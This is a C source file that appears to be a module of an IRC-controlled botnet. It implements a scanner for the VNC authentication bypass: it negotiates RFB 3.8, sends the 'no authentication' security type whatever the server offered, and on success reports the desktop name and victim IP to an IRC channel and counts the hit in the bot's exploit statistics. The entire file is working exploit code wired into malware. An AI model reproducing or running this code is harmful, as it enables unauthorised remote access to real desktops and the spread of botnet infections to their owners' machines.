#include "includes.h"
#include "functions.h"
#include "externs.h"
#include "rfb.h"

#ifndef NO_VNCSCAN

BOOL ReadExact(SOCKET r_sock, char *inbuf, int wanted) {

	int offset = 0;
	
	while (wanted > 0) {
		int bytes = frecv(r_sock, inbuf+offset, wanted, 0);
		if ((bytes == 0) || (bytes == SOCKET_ERROR)) return FALSE;
		wanted -= bytes;
		offset += bytes;
	}

	return TRUE;
}

BOOL WriteExact(SOCKET w_sock, char *buf, int bytes) {

	if (bytes == 0) return FALSE;

	int i = 0;
    int j;

    while (i < bytes) {
		j = fsend(w_sock, buf+i, bytes-i, 0);
		if (j == SOCKET_ERROR || j==0) return FALSE;
		i += j;
    }

	return TRUE;
}

inline void ReadString(SOCKET s_sock, char *buf, int length)
{
	if (length > 0)
		ReadExact(s_sock, buf, length);
	buf[length] = '\0';
}


BOOL VNCScanner(EXINFO exinfo) {

	char buffer[IRCLINE];
	char szClientPacket[] = "\x01";

	struct sockaddr_in thataddr;
	int res;
	SOCKET m_sock;

	m_sock = fsocket(PF_INET, SOCK_STREAM, 0);
	if (m_sock == INVALID_SOCKET) {
		fclosesocket(m_sock);
		return FALSE;
	}
		
	thataddr.sin_addr.s_addr = finet_addr(exinfo.ip);
	thataddr.sin_family = AF_INET;
	thataddr.sin_port = fhtons((unsigned short)exinfo.port);	

	res = fconnect(m_sock, (LPSOCKADDR) &thataddr, sizeof(thataddr));
	if (res == SOCKET_ERROR) {
		fclosesocket(m_sock);		
		return FALSE;
	}

	//connected
	//now lets negotiate protocol
	rfbProtocolVersionMsg pv;

	if (!ReadExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
		closesocket(m_sock);
		return FALSE;
	}

	pv[sz_rfbProtocolVersionMsg] = 0;

	int m_majorVersion, m_minorVersion;

	if (sscanf(pv,rfbProtocolVersionFormat,&m_majorVersion,&m_minorVersion) != 2) {
		closesocket(m_sock);
		return FALSE;
	}

	if (!(m_majorVersion == 3) && !(m_minorVersion == 8)) {
		//Server is not 3.8
		closesocket(m_sock);
		return FALSE;
	}

	if (!WriteExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
		closesocket(m_sock);
		return FALSE;
	}

	//auth part
	CARD32 authScheme, authResult;
//	CARD8 challenge[CHALLENGESIZE];
		
	//we expect to get 2 bytes 
	if (!ReadExact(m_sock, (char *)&authScheme, 2)) {
		closesocket(m_sock);
		return FALSE;
	}

	//return clientpacket
	if (!WriteExact(m_sock, szClientPacket, 1)) {
		closesocket(m_sock);
		return FALSE;
	}

	if (ReadExact(m_sock, (char *) &authResult, 4)) {
		
		authResult = Swap32IfLE(authResult);
		
		switch (authResult) {
		case rfbVncAuthOK: 
			{		
				rfbServerInitMsg m_si;
				//send non-shared session request and receive data
				if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
					ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
					//lets get desktop name
					m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
					m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
					m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
					m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
					m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
					m_si.nameLength = Swap32IfLE(m_si.nameLength);

					TCHAR *m_desktopName;
					m_desktopName = new TCHAR[m_si.nameLength + 2];
					ReadString(m_sock, m_desktopName, m_si.nameLength);

					_snprintf(buffer, sizeof(buffer), "VNC%d.%d %s: %s - [AuthBypass]", 
					m_majorVersion, m_minorVersion, m_desktopName, exinfo.ip);
					irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
					addlog(buffer);
					exploit[exinfo.exploit].stats++;

					closesocket(m_sock);
					return TRUE;

				}
				
				break;
			}
		default:
			{
				break;
			}	
		}
	}	

	closesocket(m_sock);
	return FALSE;

}

#endif